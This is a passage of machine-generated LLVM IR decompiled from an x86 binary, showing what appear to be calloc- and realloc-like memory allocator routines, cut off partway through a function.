  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 23, 9, 24, 10, 11, 12, 13, 14, 15, 25, 16, 17, 18, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8054940.49, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8052400, { 1, 0 }
  uselistorder i32 134563348, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8054620.37, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8050b98, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805460c.34 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805460c.34 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8051328, { 1, 0 }
  uselistorder label %dec_label_pc_8051317, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805130a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051306, { 1, 0 }
  uselistorder label %dec_label_pc_80512fc, { 1, 0 }
  uselistorder label %dec_label_pc_80512a7, { 1, 0 }
  uselistorder label %dec_label_pc_805127e, { 1, 0 }
  uselistorder label %dec_label_pc_805126b, { 1, 0 }
  uselistorder label %dec_label_pc_8051259, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80511eb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80511e6, { 1, 0 }
  uselistorder label %dec_label_pc_8051173, { 1, 0 }
  uselistorder label %dec_label_pc_805115c, { 1, 0 }
  uselistorder label %dec_label_pc_8051145, { 1, 0 }
  uselistorder label %dec_label_pc_80510c8, { 1, 0 }
  uselistorder label %dec_label_pc_80510bb, { 1, 0 }
  uselistorder label %dec_label_pc_805107c, { 1, 0 }
  uselistorder label %dec_label_pc_8051055, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051039, { 1, 0 }
  uselistorder label %dec_label_pc_8051020, { 1, 0 }
  uselistorder label %dec_label_pc_8051002, { 1, 0 }
  uselistorder label %dec_label_pc_8050f1d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050f15, { 1, 0 }
  uselistorder label %dec_label_pc_8050efe, { 1, 0 }
  uselistorder label %dec_label_pc_8050e91, { 1, 0 }
  uselistorder label %dec_label_pc_8050e96.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050e6a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050df1, { 1, 0 }
  uselistorder label %dec_label_pc_8050da0, { 1, 0 }
  uselistorder label %dec_label_pc_8050d78, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8050d61, { 1, 0 }
  uselistorder label %dec_label_pc_8050ccf, { 1, 0 }
  uselistorder label %dec_label_pc_8050da0.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050c9c, { 1, 0, 3, 2 }
}

define i32 @function_8051332(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051332:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051332 = load i32, i32* @edi, align 4
  %v0_8051334 = load i32, i32* @ebx, align 4
  %v12_8051335 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8051338 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_8051342 = sdiv i64 %sext, 4294967296
  %v3_8051342 = sext i32 %arg2 to i64
  %v4_8051342 = mul nsw i64 %v3_8051342, %v2_8051342
  %v5_8051342 = trunc i64 %v4_8051342 to i32
  store i32 %v5_8051342, i32* @ebx, align 4
  %v2_8051345 = icmp eq i32 %v4_8051338, 0
  br i1 %v2_8051345, label %dec_label_pc_8051367, label %dec_label_pc_8051349

dec_label_pc_8051349:                             ; preds = %dec_label_pc_8051332
  store i32 %v4_8051338, i32* @edi, align 4
  %div = udiv i32 %v5_8051342, %v4_8051338
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8051351 = icmp eq i32 %div, %arg2
  br i1 %v12_8051351, label %dec_label_pc_8051367, label %dec_label_pc_8051355

dec_label_pc_8051355:                             ; preds = %dec_label_pc_8051349
  %v1_8051355 = call i32 @function_805078b(i32 %v0_8051334)
  store i32 %v1_8051355, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805135c = inttoptr i32 %v1_8051355 to i32*
  store i32 12, i32* %v1_805135c, align 4
  br label %dec_label_pc_805141d

dec_label_pc_8051367:                             ; preds = %dec_label_pc_8051349, %dec_label_pc_8051332
  store i32 %v12_8051335, i32* @eax, align 4
  %v2_8051377 = call i32 @function_80520ea(i32 %v12_8051335, i32 134553831)
  store i32 %v2_8051377, i32* %eax.global-to-local, align 4
  %v1_8051383 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054300.32 to i32))
  store i32 %v1_8051383, i32* %eax.global-to-local, align 4
  %v0_8051388 = load i32, i32* @ebx, align 4
  %v1_805138b = call i32 @function_8050bbe(i32 %v0_8051388)
  store i32 %v1_805138b, i32* %eax.global-to-local, align 4
  store i32 %v1_805138b, i32* %ebx.global-to-local, align 4
  %v1_8051395 = icmp eq i32 %v1_805138b, 0
  br i1 %v1_8051395, label %dec_label_pc_805140c, label %dec_label_pc_8051399

dec_label_pc_8051399:                             ; preds = %dec_label_pc_8051367
  %v1_8051399 = add i32 %v1_805138b, -4
  %v2_8051399 = inttoptr i32 %v1_8051399 to i32*
  %v3_8051399 = load i32, i32* %v2_8051399, align 4
  store i32 %v3_8051399, i32* %eax.global-to-local, align 4
  %v2_805139c = and i32 %v3_8051399, 2
  %v3_805139c = icmp eq i32 %v2_805139c, 0
  %v1_805139e = icmp eq i1 %v3_805139c, false
  br i1 %v1_805139e, label %dec_label_pc_805140c, label %dec_label_pc_80513a0

dec_label_pc_80513a0:                             ; preds = %dec_label_pc_8051399
  %v1_80513a03 = add i32 %v3_8051399, -4
  %v1_80513a3 = and i32 %v1_80513a03, -4
  %v2_80513a8 = udiv i32 %v1_80513a3, 4
  store i32 %v2_80513a8, i32* %eax.global-to-local, align 4
  %v5_80513ab = icmp ult i32 %v1_80513a3, 36
  %tmp = and i32 %v1_80513a03, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_80513ae = or i1 %v5_80513ab, %tmp18
  br i1 %v2_80513ae, label %dec_label_pc_80513bf, label %dec_label_pc_80513b0

dec_label_pc_80513b0:                             ; preds = %dec_label_pc_80513a0
  %v3_80513b5 = inttoptr i32 %v1_805138b to i8*
  %v4_80513b5 = call i32 @function_80507dc(i8* %v3_80513b5, i32 0, i32 %v1_80513a3)
  store i32 %v4_80513b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805140c

dec_label_pc_80513bf:                             ; preds = %dec_label_pc_80513a0
  %v1_80513bf = inttoptr i32 %v1_805138b to i32*
  store i32 0, i32* %v1_80513bf, align 4
  %v0_80513c5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513c5 = add i32 %v0_80513c5, 4
  %v2_80513c5 = inttoptr i32 %v1_80513c5 to i32*
  store i32 0, i32* %v2_80513c5, align 4
  %v0_80513cc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513cc = add i32 %v0_80513cc, 8
  %v2_80513cc = inttoptr i32 %v1_80513cc to i32*
  store i32 0, i32* %v2_80513cc, align 4
  %v0_80513d3 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_80513d3, 5
  br i1 %tmp15, label %dec_label_pc_805140c, label %dec_label_pc_80513d8

dec_label_pc_80513d8:                             ; preds = %dec_label_pc_80513bf
  %v0_80513d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513d8 = add i32 %v0_80513d8, 12
  %v2_80513d8 = inttoptr i32 %v1_80513d8 to i32*
  store i32 0, i32* %v2_80513d8, align 4
  %v0_80513df = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513df = add i32 %v0_80513df, 16
  %v2_80513df = inttoptr i32 %v1_80513df to i32*
  store i32 0, i32* %v2_80513df, align 4
  %v0_80513e6 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_80513e6, 7
  br i1 %tmp16, label %dec_label_pc_805140c, label %dec_label_pc_80513eb

dec_label_pc_80513eb:                             ; preds = %dec_label_pc_80513d8
  %v0_80513eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513eb = add i32 %v0_80513eb, 20
  %v2_80513eb = inttoptr i32 %v1_80513eb to i32*
  store i32 0, i32* %v2_80513eb, align 4
  %v0_80513f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513f2 = add i32 %v0_80513f2, 24
  %v2_80513f2 = inttoptr i32 %v1_80513f2 to i32*
  store i32 0, i32* %v2_80513f2, align 4
  %v0_80513f9 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_80513f9, 9
  br i1 %tmp17, label %dec_label_pc_805140c, label %dec_label_pc_80513fe

dec_label_pc_80513fe:                             ; preds = %dec_label_pc_80513eb
  %v0_80513fe = load i32, i32* %ebx.global-to-local, align 4
  %v1_80513fe = add i32 %v0_80513fe, 28
  %v2_80513fe = inttoptr i32 %v1_80513fe to i32*
  store i32 0, i32* %v2_80513fe, align 4
  %v0_8051405 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051405 = add i32 %v0_8051405, 32
  %v2_8051405 = inttoptr i32 %v1_8051405 to i32*
  store i32 0, i32* %v2_8051405, align 4
  br label %dec_label_pc_805140c

dec_label_pc_805140c:                             ; preds = %dec_label_pc_80513eb, %dec_label_pc_80513d8, %dec_label_pc_80513bf, %dec_label_pc_8051399, %dec_label_pc_8051367, %dec_label_pc_80513b0, %dec_label_pc_80513fe
  store i32 %v12_8051335, i32* @eax, align 4
  %v2_8051415 = call i32 @function_80520ea(i32 %v12_8051335, i32 1)
  store i32 %v2_8051415, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805141d

dec_label_pc_805141d:                             ; preds = %dec_label_pc_8051355, %dec_label_pc_805140c
  %v0_8051420 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051420, i32* %eax.global-to-local, align 4
  store i32 %v0_8051334, i32* @ebx, align 4
  store i32 %v0_8051332, i32* @edi, align 4
  ret i32 %v0_8051420

; uselistorder directives
  uselistorder i32 %v1_80513a3, { 2, 1, 0 }
  uselistorder i32 %v1_805138b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805141d, { 1, 0 }
  uselistorder label %dec_label_pc_805140c, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8051426() local_unnamed_addr {
dec_label_pc_8051426:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8051426 = load i32, i32* @ebp, align 4
  %v0_8051427 = load i32, i32* @edi, align 4
  %v0_8051428 = load i32, i32* @esi, align 4
  %v0_8051429 = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8051431 = icmp eq i32 %tmp6, 0
  %v1_8051436 = icmp eq i1 %v4_8051431, false
  br i1 %v1_8051436, label %dec_label_pc_8051448, label %dec_label_pc_8051438

dec_label_pc_8051438:                             ; preds = %dec_label_pc_8051426
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_805143c = call i32 @function_8050bbe(i32 %tmp7)
  store i32 %v1_805143c, i32* %eax.global-to-local, align 4
  store i32 %v1_805143c, i32* @ebx, align 4
  br label %dec_label_pc_8051741

dec_label_pc_8051448:                             ; preds = %dec_label_pc_8051426
  %v1_8051448 = icmp eq i32 %tmp7, 0
  %v1_805144a = icmp eq i1 %v1_8051448, false
  br i1 %v1_805144a, label %dec_label_pc_805145d, label %dec_label_pc_805144c

dec_label_pc_805144c:                             ; preds = %dec_label_pc_8051448
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051453 = call i32 @function_8051983(i32 %tmp6)
  store i32 %v1_8051453, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051741

dec_label_pc_805145d:                             ; preds = %dec_label_pc_8051448
  %v2_8051468 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051468, i32* @eax, align 4
  store i32 %v2_8051468, i32* %stack_var_-60, align 4
  %v2_805146d = call i32 @function_80520ea(i32 %v2_8051468, i32 134553831)
  store i32 %v2_805146d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054300.32 to i32), i32* %stack_var_-60, align 4
  %v1_8051479 = call i32 @function_80520e7(i32 ptrtoint (i32* @global_var_8054300.32 to i32))
  store i32 %v1_8051479, i32* %eax.global-to-local, align 4
  %v0_8051481 = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_8051481, -32
  br i1 %tmp20, label %dec_label_pc_8051498, label %dec_label_pc_8051486

dec_label_pc_8051486:                             ; preds = %dec_label_pc_805145d
  %v0_8051486 = load i32, i32* %stack_var_-60, align 4
  %v1_8051486 = call i32 @function_805078b(i32 %v0_8051486)
  store i32 %v1_8051486, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805148d = inttoptr i32 %v1_8051486 to i32*
  store i32 12, i32* %v1_805148d, align 4
  br label %dec_label_pc_8051744

dec_label_pc_8051498:                             ; preds = %dec_label_pc_805145d
  %v1_8051498 = add i32 %v0_8051481, 11
  %tmp21 = icmp ult i32 %v1_8051498, 16
  %v1_80514a8 = and i32 %v1_8051498, -8
  %v1_8051498.v1_80514a8 = select i1 %tmp21, i32 %v1_8051498, i32 %v1_80514a8
  %.v1_80514a8 = select i1 %tmp21, i32 16, i32 %v1_80514a8
  store i32 %v1_8051498.v1_80514a8, i32* %eax.global-to-local, align 4
  %v1_80514b3 = add i32 %tmp6, -8
  store i32 %v1_80514b3, i32* @edi, align 4
  %v1_80514b6 = add i32 %tmp6, -4
  %v2_80514b6 = inttoptr i32 %v1_80514b6 to i32*
  %v3_80514b6 = load i32, i32* %v2_80514b6, align 4
  store i32 %v3_80514b6, i32* @edx, align 4
  %v1_80514bb = and i32 %v3_80514b6, -4
  store i32 %v1_80514bb, i32* %eax.global-to-local, align 4
  %v2_80514c2 = and i32 %v3_80514b6, 2
  %v3_80514c2 = icmp eq i32 %v2_80514c2, 0
  %v1_80514c5 = icmp eq i1 %v3_80514c2, false
  br i1 %v1_80514c5, label %dec_label_pc_805165f, label %dec_label_pc_80514cb

dec_label_pc_80514cb:                             ; preds = %dec_label_pc_8051498
  store i32 %.v1_80514a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80514bb, i32* @ebx, align 4
  %v7_80514d1 = icmp ult i32 %v1_80514bb, %.v1_80514a8
  %v1_80514d3 = icmp eq i1 %v7_80514d1, false
  br i1 %v1_80514d3, label %dec_label_pc_805160a, label %dec_label_pc_80514d9

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514cb
  %v2_80514d9 = add i32 %v1_80514bb, %v1_80514b3
  store i32 %v2_80514d9, i32* @esi, align 4
  %v1_80514dc = load i32, i32* @global_var_805460c.34, align 4
  %v12_80514dc = icmp eq i32 %v2_80514d9, %v1_80514dc
  %v1_80514e2 = icmp eq i1 %v12_80514dc, false
  %v1_805151c = add i32 %v2_80514d9, 4
  %v2_805151c = inttoptr i32 %v1_805151c to i32*
  %v3_805151c = load i32, i32* %v2_805151c, align 4
  br i1 %v1_80514e2, label %dec_label_pc_805151c, label %dec_label_pc_80514e4

dec_label_pc_80514e4:                             ; preds = %dec_label_pc_80514d9
  %v1_80514e9 = and i32 %v3_805151c, -4
  %v2_80514ec = add i32 %v1_80514e9, %v1_80514bb
  store i32 %v2_80514ec, i32* %ecx.global-to-local, align 4
  %v1_80514f2 = add i32 %.v1_80514a8, 16
  store i32 %v1_80514f2, i32* %eax.global-to-local, align 4
  %v7_80514f5 = icmp ult i32 %v2_80514ec, %v1_80514f2
  br i1 %v7_80514f5, label %dec_label_pc_805155a, label %dec_label_pc_80514f9

dec_label_pc_80514f9:                             ; preds = %dec_label_pc_80514e4
  %v1_80514f9 = urem i32 %v3_80514b6, 2
  %v5_80514fc = or i32 %v1_80514f9, %.v1_80514a8
  store i32 %v5_80514fc, i32* @edx, align 4
  store i32 %v5_80514fc, i32* %v2_80514b6, align 4
  %v0_8051507 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051507 = sub i32 %v0_8051507, %.v1_80514a8
  %v0_8051509 = load i32, i32* @edi, align 4
  %v2_8051509 = add i32 %v0_8051509, %.v1_80514a8
  store i32 %v2_8051509, i32* %eax.global-to-local, align 4
  %v1_805150c = or i32 %v2_8051507, 1
  store i32 %v1_805150c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051509, i32* @global_var_805460c.34, align 4
  %v2_8051514 = add i32 %v2_8051509, 4
  %v3_8051514 = inttoptr i32 %v2_8051514 to i32*
  store i32 %v1_805150c, i32* %v3_8051514, align 4
  br label %dec_label_pc_805172f

dec_label_pc_805151c:                             ; preds = %dec_label_pc_80514d9
  %v1_8051521 = and i32 %v3_805151c, -2
  store i32 %v1_8051521, i32* %eax.global-to-local, align 4
  %v3_8051524 = add i32 %v1_805151c, %v1_8051521
  %v4_8051524 = inttoptr i32 %v3_8051524 to i8*
  %v5_8051524 = load i8, i8* %v4_8051524, align 1
  %v6_8051524 = urem i8 %v5_8051524, 2
  %v7_8051524 = icmp eq i8 %v6_8051524, 0
  %v1_8051529 = icmp eq i1 %v7_8051524, false
  br i1 %v1_8051529, label %dec_label_pc_805155a, label %dec_label_pc_805152b

dec_label_pc_805152b:                             ; preds = %dec_label_pc_805151c
  %v1_805152b = and i32 %v3_805151c, -4
  %v2_8051532 = add i32 %v1_805152b, %v1_80514bb
  store i32 %v2_8051532, i32* @ebx, align 4
  %v10_8051534 = icmp ult i32 %v2_8051532, %.v1_80514a8
  br i1 %v10_8051534, label %dec_label_pc_805155a, label %dec_label_pc_805153a

dec_label_pc_805153a:                             ; preds = %dec_label_pc_805152b
  %v1_805153a = add i32 %v1_80514bb, %tmp6
  %v2_805153a = inttoptr i32 %v1_805153a to i32*
  %v3_805153a = load i32, i32* %v2_805153a, align 4
  store i32 %v3_805153a, i32* @edx, align 4
  %v1_805153d = add i32 %v2_80514d9, 12
  %v2_805153d = inttoptr i32 %v1_805153d to i32*
  %v3_805153d = load i32, i32* %v2_805153d, align 4
  store i32 %v3_805153d, i32* %eax.global-to-local, align 4
  %v1_8051540 = add i32 %v3_805153a, 12
  %v2_8051540 = inttoptr i32 %v1_8051540 to i32*
  %v3_8051540 = load i32, i32* %v2_8051540, align 4
  %v15_8051540 = icmp eq i32 %v3_8051540, %v2_80514d9
  %v1_8051543 = icmp eq i1 %v15_8051540, false
  br i1 %v1_8051543, label %dec_label_pc_805154a, label %dec_label_pc_8051545

dec_label_pc_8051545:                             ; preds = %dec_label_pc_805153a
  %v1_8051545 = add i32 %v3_805153d, 8
  %v2_8051545 = inttoptr i32 %v1_8051545 to i32*
  %v3_8051545 = load i32, i32* %v2_8051545, align 4
  %v15_8051545 = icmp eq i32 %v3_8051545, %v2_80514d9
  br i1 %v15_8051545, label %dec_label_pc_805154f, label %dec_label_pc_805154a

dec_label_pc_805154a:                             ; preds = %dec_label_pc_8051545, %dec_label_pc_805153a
  %v0_805154a = call i32 @function_8051b1f()
  store i32 %v0_805154a, i32* %eax.global-to-local, align 4
  %v1_805154f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805154f

dec_label_pc_805154f:                             ; preds = %dec_label_pc_8051545, %dec_label_pc_805154a
  %v1_805154f = phi i32 [ %v3_805153a, %dec_label_pc_8051545 ], [ %v1_805154f.pre, %dec_label_pc_805154a ]
  %v0_805154f = phi i32 [ %v3_805153d, %dec_label_pc_8051545 ], [ %v0_805154a, %dec_label_pc_805154a ]
  %v2_805154f = add i32 %v1_805154f, 12
  %v3_805154f = inttoptr i32 %v2_805154f to i32*
  store i32 %v0_805154f, i32* %v3_805154f, align 4
  %v0_8051552 = load i32, i32* @edx, align 4
  %v1_8051552 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051552 = add i32 %v1_8051552, 8
  %v3_8051552 = inttoptr i32 %v2_8051552 to i32*
  store i32 %v0_8051552, i32* %v3_8051552, align 4
  %v0_805160a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805160a

dec_label_pc_805155a:                             ; preds = %dec_label_pc_805152b, %dec_label_pc_805151c, %dec_label_pc_80514e4
  %v1_8051561 = add i32 %.v1_80514a8, -7
  store i32 %v1_8051561, i32* %eax.global-to-local, align 4
  store i32 %v1_8051561, i32* %stack_var_-60, align 4
  %v1_8051565 = call i32 @function_8050bbe(i32 %v1_8051561)
  store i32 %v1_8051565, i32* %eax.global-to-local, align 4
  store i32 %v1_8051565, i32* @edx, align 4
  %v1_805156f = icmp eq i32 %v1_8051565, 0
  br i1 %v1_805156f, label %dec_label_pc_805172b, label %dec_label_pc_8051577

dec_label_pc_8051577:                             ; preds = %dec_label_pc_805155a
  %v1_8051577 = add i32 %v1_8051565, -8
  store i32 %v1_8051577, i32* %ebx.global-to-local, align 4
  %v1_805157a = load i32, i32* @esi, align 4
  %v12_805157a = icmp eq i32 %v1_8051577, %v1_805157a
  %v1_805157c = add i32 %v1_8051565, -4
  %v2_805157c = inttoptr i32 %v1_805157c to i32*
  %v3_805157c = load i32, i32* %v2_805157c, align 4
  store i32 %v3_805157c, i32* %eax.global-to-local, align 4
  %v1_805157f = icmp eq i1 %v12_805157a, false
  br i1 %v1_805157f, label %dec_label_pc_805158d, label %dec_label_pc_8051581

dec_label_pc_8051581:                             ; preds = %dec_label_pc_8051577
  %v1_8051581 = and i32 %v3_805157c, -4
  store i32 %v1_8051581, i32* %eax.global-to-local, align 4
  store i32 %v1_80514bb, i32* @edx, align 4
  %v2_8051588 = add i32 %v1_8051581, %v1_80514bb
  store i32 %v2_8051588, i32* @ebx, align 4
  br label %dec_label_pc_805160a

dec_label_pc_805158d:                             ; preds = %dec_label_pc_8051577
  %v1_8051591 = add i32 %v1_80514bb, -4
  store i32 %v1_8051591, i32* %eax.global-to-local, align 4
  %v2_8051596 = udiv i32 %v1_8051591, 4
  store i32 %v2_8051596, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051591, 37
  br i1 %tmp, label %dec_label_pc_80515af, label %dec_label_pc_805159e

dec_label_pc_805159e:                             ; preds = %dec_label_pc_805158d
  store i32 %v1_8051565, i32* %stack_var_-60, align 4
  %v3_80515a5 = inttoptr i32 %v1_8051565 to i16*
  %v4_80515a5 = call i32 @function_80529aa(i16* %v3_80515a5, i32 %tmp6, i32 %v1_8051591)
  store i32 %v4_80515a5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515f6

dec_label_pc_80515af:                             ; preds = %dec_label_pc_805158d
  store i32 %tmp6, i32* @esi, align 4
  %v1_80515b6 = inttoptr i32 %tmp6 to i32*
  %v2_80515b6 = load i32, i32* %v1_80515b6, align 4
  store i32 %v2_80515b6, i32* %eax.global-to-local, align 4
  %v2_80515b8 = inttoptr i32 %v1_8051565 to i32*
  store i32 %v2_80515b6, i32* %v2_80515b8, align 4
  %v0_80515ba = load i32, i32* @esi, align 4
  %v1_80515ba = add i32 %v0_80515ba, 4
  %v2_80515ba = inttoptr i32 %v1_80515ba to i32*
  %v3_80515ba = load i32, i32* %v2_80515ba, align 4
  store i32 %v3_80515ba, i32* %eax.global-to-local, align 4
  %v1_80515bd = load i32, i32* @edx, align 4
  %v2_80515bd = add i32 %v1_80515bd, 4
  %v3_80515bd = inttoptr i32 %v2_80515bd to i32*
  store i32 %v3_80515ba, i32* %v3_80515bd, align 4
  %v0_80515c0 = load i32, i32* @esi, align 4
  %v1_80515c0 = add i32 %v0_80515c0, 8
  %v2_80515c0 = inttoptr i32 %v1_80515c0 to i32*
  %v3_80515c0 = load i32, i32* %v2_80515c0, align 4
  store i32 %v3_80515c0, i32* %eax.global-to-local, align 4
  %v1_80515c3 = load i32, i32* @edx, align 4
  %v2_80515c3 = add i32 %v1_80515c3, 8
  %v3_80515c3 = inttoptr i32 %v2_80515c3 to i32*
  store i32 %v3_80515c0, i32* %v3_80515c3, align 4
  %tmp27 = icmp ult i32 %v1_8051591, 17
  br i1 %tmp27, label %dec_label_pc_80515f6, label %dec_label_pc_80515c8

dec_label_pc_80515c8:                             ; preds = %dec_label_pc_80515af
  %v0_80515c8 = load i32, i32* @esi, align 4
  %v1_80515c8 = add i32 %v0_80515c8, 12
  %v2_80515c8 = inttoptr i32 %v1_80515c8 to i32*
  %v3_80515c8 = load i32, i32* %v2_80515c8, align 4
  store i32 %v3_80515c8, i32* %eax.global-to-local, align 4
  %v0_80515cb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80515ce = load i32, i32* @edx, align 4
  %v2_80515ce = add i32 %v1_80515ce, 12
  %v3_80515ce = inttoptr i32 %v2_80515ce to i32*
  store i32 %v3_80515c8, i32* %v3_80515ce, align 4
  %v0_80515d1 = load i32, i32* @esi, align 4
  %v1_80515d1 = add i32 %v0_80515d1, 16
  %v2_80515d1 = inttoptr i32 %v1_80515d1 to i32*
  %v3_80515d1 = load i32, i32* %v2_80515d1, align 4
  store i32 %v3_80515d1, i32* %eax.global-to-local, align 4
  %v1_80515d4 = load i32, i32* @edx, align 4
  %v2_80515d4 = add i32 %v1_80515d4, 16
  %v3_80515d4 = inttoptr i32 %v2_80515d4 to i32*
  store i32 %v3_80515d1, i32* %v3_80515d4, align 4
  %tmp22 = icmp ult i32 %v0_80515cb, 7
  br i1 %tmp22, label %dec_label_pc_80515f6, label %dec_label_pc_80515d9

dec_label_pc_80515d9:                             ; preds = %dec_label_pc_80515c8
  %v0_80515d9 = load i32, i32* @esi, align 4
  %v1_80515d9 = add i32 %v0_80515d9, 20
  %v2_80515d9 = inttoptr i32 %v1_80515d9 to i32*
  %v3_80515d9 = load i32, i32* %v2_80515d9, align 4
  store i32 %v3_80515d9, i32* %eax.global-to-local, align 4
  %v0_80515dc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80515df = load i32, i32* @edx, align 4
  %v2_80515df = add i32 %v1_80515df, 20
  %v3_80515df = inttoptr i32 %v2_80515df to i32*
  store i32 %v3_80515d9, i32* %v3_80515df, align 4
  %v0_80515e2 = load i32, i32* @esi, align 4
  %v1_80515e2 = add i32 %v0_80515e2, 24
  %v2_80515e2 = inttoptr i32 %v1_80515e2 to i32*
  %v3_80515e2 = load i32, i32* %v2_80515e2, align 4
  store i32 %v3_80515e2, i32* %eax.global-to-local, align 4
  %v1_80515e5 = load i32, i32* @edx, align 4
  %v2_80515e5 = add i32 %v1_80515e5, 24
  %v3_80515e5 = inttoptr i32 %v2_80515e5 to i32*
  store i32 %v3_80515e2, i32* %v3_80515e5, align 4
  %tmp23 = icmp ult i32 %v0_80515dc, 9
  br i1 %tmp23, label %dec_label_pc_80515f6, label %dec_label_pc_80515ea

dec_label_pc_80515ea:                             ; preds = %dec_label_pc_80515d9
  %v0_80515ea = load i32, i32* @esi, align 4
  %v1_80515ea = add i32 %v0_80515ea, 28
  %v2_80515ea = inttoptr i32 %v1_80515ea to i32*
  %v3_80515ea = load i32, i32* %v2_80515ea, align 4
  store i32 %v3_80515ea, i32* %eax.global-to-local, align 4
  %v1_80515ed = load i32, i32* @edx, align 4
  %v2_80515ed = add i32 %v1_80515ed, 28
  %v3_80515ed = inttoptr i32 %v2_80515ed to i32*
  store i32 %v3_80515ea, i32* %v3_80515ed, align 4
  %v0_80515f0 = load i32, i32* @esi, align 4
  %v1_80515f0 = add i32 %v0_80515f0, 32
  %v2_80515f0 = inttoptr i32 %v1_80515f0 to i32*
  %v3_80515f0 = load i32, i32* %v2_80515f0, align 4
  store i32 %v3_80515f0, i32* %eax.global-to-local, align 4
  %v1_80515f3 = load i32, i32* @edx, align 4
  %v2_80515f3 = add i32 %v1_80515f3, 32
  %v3_80515f3 = inttoptr i32 %v2_80515f3 to i32*
  store i32 %v3_80515f0, i32* %v3_80515f3, align 4
  br label %dec_label_pc_80515f6

